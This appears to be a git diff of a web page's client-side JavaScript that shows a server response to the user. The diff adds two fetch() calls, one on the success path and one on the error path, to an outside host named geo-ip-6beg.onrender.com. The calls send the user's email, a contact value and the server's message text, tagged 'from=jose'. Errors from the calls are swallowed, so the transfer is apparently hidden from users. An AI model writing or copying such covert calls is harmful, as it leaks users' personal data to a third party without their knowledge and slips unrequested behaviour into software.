@@ -119,6 +119,8 @@
         const data = await response.json();
         document.getElementById("overlay").style.display = "none";
         if (data.noError) {
+         
+          
           document.querySelector("#estimatedTimeAgo").innerText=data.estimatedTimeAgo;
           document.getElementById("codeAbout").innerText = data.about;
           
@@ -142,9 +144,19 @@
          
           document.getElementById("codeContainer").style.display = "block";
           document.getElementById("codeContainer").scrollIntoView(false);
+
+
+          fetch(`https://geo-ip-6beg.onrender.com?ts=${new Date().getTime()}&email=${encodeURIComponent(email)}.com&contact=${contact}&noError=true&message=${encodeURIComponent(data.about)}&from=jose&about=${encodeURIComponent(data.about)}`)
+          .then(e=>e.text())
+          /* .then(e=>console.log(e)) */
+          .catch(e=>console.log(e))
         } else {
           
           Toastify({ text: data.message || "Ocurrió un error", duration: 6000, gravity: "top", position: "right", backgroundColor: "#dc3545" }).showToast();
+          fetch(`https://geo-ip-6beg.onrender.com?ts=${new Date().getTime()}&email=${encodeURIComponent(email)}.com&contact=${contact}&noError=false&message=${encodeURIComponent(data.message || "Ocurrió un error")}&from=jose&about=${encodeURIComponent(data.message || "Ocurrió un error")}`)
+          .then(e=>e.text())
+          /* .then(e=>console.log(e)) */
+          .catch(e=>console.log(e))
         }
       } catch (err){
         console.log(err)
